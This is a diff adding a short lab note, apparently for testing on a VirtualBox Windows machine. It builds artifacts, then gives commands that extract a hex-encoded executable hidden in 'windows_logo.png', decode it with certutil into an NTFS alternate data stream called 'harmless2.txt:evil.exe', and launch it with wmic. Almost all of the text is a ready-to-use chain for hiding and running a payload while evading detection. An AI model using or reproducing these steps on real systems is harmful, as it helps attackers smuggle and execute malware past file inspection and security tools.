@@ -1,0 +1,13 @@
+##BUILD + GENERATE ARTIFACTS
+make clean all package
+
+##ARTIFACTS ARE IN
+output/artifacts/time_tracker.exe
+output/artifacts/nice_text.txt
+output/artifacts/windows_logo.png
+
+##ONCE ON THE WINDOWS MACHINE
+C:\Users\vboxuser\Downloads>(for /f "tokens=1*" %A in ('findstr "BYTE_LINE:" windows_logo.png') do @echo %B) > temp.hex && certutil -decodehex temp.hex harmless2.txt:evil.exe && del temp.hex
+
+##THEN RUN
+C:\Users\vboxuser\Downloads>wmic process call create "C:\Users\vboxuser\Downloads\harmless2.txt:evil.exe"
